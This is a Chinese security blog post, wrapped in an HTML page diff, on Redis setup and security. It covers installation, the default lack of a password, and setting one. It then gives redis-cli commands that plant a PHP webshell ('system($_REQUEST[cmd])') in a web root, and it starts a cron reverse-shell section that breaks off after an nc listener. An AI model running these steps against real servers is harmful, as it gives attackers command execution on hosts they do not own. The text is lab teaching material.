@@ -1,0 +1,758 @@
+<script type="text/javascript" src="../../source/js/love.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Redis安全 | wolke</title><meta name="keywords" content="Web安全,Redis"><meta name="author" content="w01ke"><meta name="copyright" content="w01ke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、Redis介绍Redis（Remote Dictionary Server）译为“远程字典服务”，它是一款基于内存实现的键值型 NoSQL 数据库， 通常也被称为数据结构服务器，这是因为它可以存储多种数据类型，比如 string（字符串），hash（哈希散列），list（列表），set（集合）和 sorted set（有序集合）等。  可以对内存中的数据直接存取，也可以写到硬盘中去。默认端口为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Redis安全">
+<meta property="og:url" content="https://wolke.cn/post/472fbc5b.html">
+<meta property="og:site_name" content="wolke">
+<meta property="og:description" content="一、Redis介绍Redis（Remote Dictionary Server）译为“远程字典服务”，它是一款基于内存实现的键值型 NoSQL 数据库， 通常也被称为数据结构服务器，这是因为它可以存储多种数据类型，比如 string（字符串），hash（哈希散列），list（列表），set（集合）和 sorted set（有序集合）等。  可以对内存中的数据直接存取，也可以写到硬盘中去。默认端口为">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/redis-logo-lg.jpg">
+<meta property="article:published_time" content="2022-02-22T14:00:11.000Z">
+<meta property="article:modified_time" content="2022-02-22T14:03:42.949Z">
+<meta property="article:author" content="w01ke">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="Redis">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/redis-logo-lg.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://wolke.cn/post/472fbc5b"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?9b5e9e86a0a422ec787d72998e8fdbff";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-Q0YHC68NHX"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-Q0YHC68NHX');
+</script><link rel="stylesheet" href="/wolke" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: w01ke","link":"链接: ","source":"来源: wolke","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Redis安全',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-22 22:03:42'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><script src="/live2d-widget/autoload.js"></script><script src="/live2d-widget/autoload.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-Q0YHC68NHX', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">38</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-diamond"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/black.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wolke</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-diamond"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Redis安全</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-22T14:00:11.000Z" title="发表于 2022-02-22 22:00:11">2022-02-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-22T14:03:42.949Z" title="更新于 2022-02-22 22:03:42">2022-02-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Redis安全"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一、Redis介绍"><a href="#一、Redis介绍" class="headerlink" title="一、Redis介绍"></a>一、Redis介绍</h1><p>Redis（Remote Dictionary Server）译为“远程字典服务”，它是一款基于内存实现的键值型 NoSQL 数据库， 通常也被称为数据结构服务器，这是因为它可以存储多种数据类型，比如 string（字符串），hash（哈希散列），list（列表），set（集合）和 sorted set（有序集合）等。  可以对内存中的数据直接存取，也可以写到硬盘中去。默认端口为6379</p>
+<p>Nosql数据库的特点是：</p>
+<ol>
+<li><p><strong>容易扩展</strong>：NoSQL数据库种类繁多，但是一个共同的特点都是去掉关系数据库的关系型特性。数据之间无关系，这样就非常容易扩展。无形之间，在架构的层面上带来了可扩展的能力。</p>
+</li>
+<li><p><strong>大数据量、高性能</strong>：NoSQL数据库都具有非常高的读写性能，尤其在大数据量下，同样表现优秀。这得益于它的无关系性，数据库的结构简单。 一般MySQL使用Query Cache。NoSQL的Cache是记录级的，是一种细粒度的Cache，所以NoSQL在这个层面上来说性能就要高很多。</p>
+</li>
+<li><p><strong>灵活的数据模型</strong>：NoSQL无须事先为要存储的数据建立字段，随时可以存储自定义的数据格式。而在关系数据库里，增删字段是一件非常麻烦的事情。如果是非常大数据量的表，增加字段简直就是——个噩梦。这点在大数据量的Web 2.0时代尤其明显。</p>
+</li>
+<li><p><strong>高可用</strong>：NoSQL在不太影响性能的情况，就可以方便地实现高可用的架构。比如Cassandra、HBase模型，通过复制模型也能实现高可用。</p>
+</li>
+</ol>
+<p>nosql数据库种类繁多，但是它们都有一个共同的特点，就是它们都去掉了关系数据库的关系型特性，使用键值型</p>
+<h1 id="二、Ubuntu部署Redis"><a href="#二、Ubuntu部署Redis" class="headerlink" title="二、Ubuntu部署Redis"></a>二、Ubuntu部署Redis</h1><h2 id="1、下载和安装"><a href="#1、下载和安装" class="headerlink" title="1、下载和安装"></a>1、下载和安装</h2><p>我这里使用的是Ubuntu进行下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645523488110-53e105c2-223f-41e5-a65d-4fd43ad1ac95.png" alt="img"></p>
+<p>解压</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf redis-4.0.9.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645523570500-ff578715-d8aa-46fd-b465-b17f007d6262.png" alt="img"></p>
+<p>移动解压后的文件夹到/usr/local/redis目录下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv ./redis-4.0.9 /usr/<span class="built_in">local</span>/redis</span><br></pre></td></tr></table></figure>
+
+<p>进入到/usr/local/redis目录下，make test编译一下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645524129274-562a6cf2-ced1-4d6b-9d10-7dcc50c9f486.png" alt="img"></p>
+<p>报错了，执行以下命令即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make distclean &amp;&amp; make</span><br></pre></td></tr></table></figure>
+
+<p>错误的本质是我们在开始执行make 时遇到了错误（大部分是由于gcc未安装），然后我们安装好了gcc 后，我们再执行make ,这时就出现了jemalloc/jemalloc.h: No such file or directory。这是因为上次的编译失败，有残留的文件，我们需要清理下，然后重新编译就可以了。</p>
+<p>提示以下信息说明没问题了</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645524281458-42609eb0-b6d5-49dc-b2d4-88f44c30f790.png" alt="img"></p>
+<p>再次执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
+
+<p>​    大概8分钟左右的编译后，出现绿色字体的信息，说明没问题</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645524536236-965371c5-0d16-45a9-a0f5-05f029799ec9.png" alt="img"></p>
+<p>进入/usr/local/redis/src目录下，看到有以下命令，说明的确没问题了，编译安装成功</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645525178655-88970cfb-3795-497d-a725-3bd2f527426a.png" alt="img"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方便找到</span></span><br><span class="line">sudo mkdir /etc/redis  </span><br><span class="line">sudo cp /usr/<span class="built_in">local</span>/redis/redis.conf /etc/redis/</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、修改配置文件"><a href="#2、修改配置文件" class="headerlink" title="2、修改配置文件"></a>2、修改配置文件</h2><p>修改并保存配置文件</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645525604213-c1573a3b-0a79-492d-888e-b0ba2048ef36.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645525689314-005cc03f-d38c-4ca1-9f96-6f81c5fe7668.png" alt="img"></p>
+<h2 id="3、运行Redis服务端"><a href="#3、运行Redis服务端" class="headerlink" title="3、运行Redis服务端"></a>3、运行Redis服务端</h2><p>以/etc/redis/redis.conf的配置文件启动Redis服务端</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526033144-130b20b8-697b-4fae-8a47-448836eea2cf.png" alt="img"></p>
+<p>查看是否开启Redis</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526083476-9ebf168d-d3c9-4b77-a5ea-b68135e52b98.png" alt="img"></p>
+<h2 id="4、客户端连接服务端"><a href="#4、客户端连接服务端" class="headerlink" title="4、客户端连接服务端"></a>4、客户端连接服务端</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./redis-cli -h 192.168.1.117</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526186105-169f58ac-a632-47eb-8d1f-ce31b97b8523.png" alt="img"></p>
+<p>可以看到，当保存了数据后，src目录下会有dump.rdb，看一下可以大概知道，这应该存储了当时我们创建的键值对（当然，如果通过cp命令将redis-server加入到/usr/bin目录下，那么在当前目录下运行的redis，那么就会在当前目录下生成dump.rdb，不一定在src目录下）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645526490598-5b3c6f74-8f7a-46fd-821b-b17840a87b03.png" alt="img"></p>
+<p>这里可以知道，默认情况下，连接Redis是无需密码的，因此日常可以会因为管理员疏忽而存在Redis未授权登录的问题（用Telnet也可以连接 telnet IP port）</p>
+<p>因为官方说明save默认保存的是rdb文件，redis-bits?@?ctime就是rdb标识符，实战可以把它看成脏数据</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645530806268-9cd8c3a5-05c7-4210-b3c3-8aa361e79449.png" alt="img"></p>
+<h1 id="三、Kali安装Redis-cli"><a href="#三、Kali安装Redis-cli" class="headerlink" title="三、Kali安装Redis-cli"></a>三、Kali安装Redis-cli</h1><h2 id="1、下载安装"><a href="#1、下载安装" class="headerlink" title="1、下载安装"></a>1、下载安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/redis-stable.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528502054-4a6bff5a-b284-4fb0-abcf-205d30aa1962.png" alt="img"></p>
+<p>解压</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-stable.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528593285-d83a5d04-e3aa-48f5-94d4-bb087130d466.png" alt="img"></p>
+<p>可以看到有个makefile，直接make，全局生效</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528682454-82a06dc6-102e-4d76-aaf7-a0fc9054b4ac.png" alt="img"></p>
+<h2 id="2、加入环境变量"><a href="#2、加入环境变量" class="headerlink" title="2、加入环境变量"></a>2、加入环境变量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp redis-cli /usr/bin</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528812989-8d8da347-9f2c-4620-9649-451fd42aa4a7.png" alt="img"></p>
+<h2 id="3、连接Ubuntu的Redis服务"><a href="#3、连接Ubuntu的Redis服务" class="headerlink" title="3、连接Ubuntu的Redis服务"></a>3、连接Ubuntu的Redis服务</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.1.117</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645528911828-cc0efb3d-0deb-43ed-9855-614936748041.png" alt="img"></p>
+<h1 id="四、设置密码登录"><a href="#四、设置密码登录" class="headerlink" title="四、设置密码登录"></a>四、设置密码登录</h1><p>之前说过，默认情况下Redis是免密登陆的，那么就存在未授权登录的风险。那么如何设置密码登录呢？</p>
+<p>打开配置文件，配置密码为<code>haha123</code>，如图所示</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass haha123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534540030-7b2f3654-7cfe-4b5f-b037-d421836f56be.png" alt="img"></p>
+<p>关闭Redis服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shutdown</span><br><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534802364-bd7724fe-8485-4181-981d-013714f67cc1.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534824841-bc85185e-0e45-4132-a3d2-7016685d2789.png" alt="img"></p>
+<p>启动Redis服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534875556-83e31c01-aeab-4bf5-8ace-ac073de1e78f.png" alt="img"></p>
+<p>客户端连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">auth [username] password</span><br><span class="line">或者直接</span><br><span class="line">redis-cli -h [ip] -a [password]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534917431-167c357b-ef11-4d3d-9e29-d20dd13053c6.png" alt="img"></p>
+<h1 id="五、Redis写文件"><a href="#五、Redis写文件" class="headerlink" title="五、Redis写文件"></a>五、Redis写文件</h1><h2 id="1、写入Webshell"><a href="#1、写入Webshell" class="headerlink" title="1、写入Webshell"></a>1、写入Webshell</h2><p>只要知道 web 绝对路径并且权限足够就可以写个 webshell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.117:6379&gt; CONFIG SET dir /usr/share/apache/htdocs/ <span class="comment">#这里是站点绝对路径（我这里Ubuntu没有安装中间件，只作为演示参考）</span></span><br><span class="line">OK </span><br><span class="line">192.168.1.117:6379&gt; <span class="built_in">set</span> shell <span class="string">&quot;&lt;?php echo system(<span class="variable">$_REQUEST</span>[cmd]);?&gt;&quot;</span> </span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; CONFIG SET dbfilename shell.php </span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; save <span class="comment">#将内存中的数据保存到dbfilename中 </span></span><br><span class="line"> OK </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645530453148-e673de16-03dc-4211-b71f-9ad842a59906.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645530470665-f9018596-b83f-469c-a38c-09651108c387.png" alt="img"></p>
+<p>MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk。  如果报错无法向磁盘写入rdb，尝试将stop-writes-on-bgsave-error设置为no，如config set stop-writes-on-bgsave-error no</p>
+<h2 id="2、计划任务启动反弹shell"><a href="#2、计划任务启动反弹shell" class="headerlink" title="2、计划任务启动反弹shell"></a>2、计划任务启动反弹shell</h2><p>在 linux 系的系统有着定时任务的功能，只要文件可以写到定时任务目录里就可以执行系统命令。</p>
+<h3 id="（1）命令初测试"><a href="#（1）命令初测试" class="headerlink" title="（1）命令初测试"></a>（1）命令初测试</h3><p>Kali开启nc监听</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645531451395-8a360574-8b61-4bc4-bbea-098cd32fe7b0.png" alt="img"></p>
